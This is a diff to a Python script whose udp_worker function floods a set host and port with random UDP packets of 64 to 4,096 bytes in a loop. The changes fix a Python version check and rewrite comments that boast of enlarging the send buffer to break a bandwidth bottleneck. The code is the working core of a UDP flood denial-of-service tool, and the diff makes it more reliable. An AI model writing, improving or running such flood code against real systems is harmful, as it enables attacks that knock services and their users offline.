@@ -12,8 +12,8 @@ import os  # Native high-speed hardware random operations
 # ==========================================
 # VERSION COMPATIBILITY DETECTION & IMPORTS
 # ==========================================
-# UNIVERSAL FIX: Extract index 0 explicitly to prevent legacy Python 2 interpreter panics
-IS_PY3 = sys.version_info >= 3
+# THE UNIVERSAL FIX: Extract index 0 explicitly to prevent interpreter panics
+IS_PY3 = sys.version_info[0] >= 3
 
 if IS_PY3:
     import urllib.request as url_lib
@@ -158,20 +158,17 @@ def udp_worker():
     
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # THE FIX: Force allow immediate reuse of local system ports
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        # THE CRITICAL UPGRADE: Explodes the outbound pipe buffer layout to completely break the 12kbps bottleneck!
+        # Manually expands outbound memory pipes to clear the kbps bottleneck completely
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
     except:
         return
         
     while running:
         try:
-            # Replicates your dynamic size selection: Scrambles packets between 64 and 4096 bytes per loop
             packet_size = random.randint(64, 4096)
             packet = os.urandom(packet_size)
             
-            # Unlocked independent socket fires raw data immediately down the interface line
             sock.sendto(packet, (HOST, PORT))
             
             with lock:
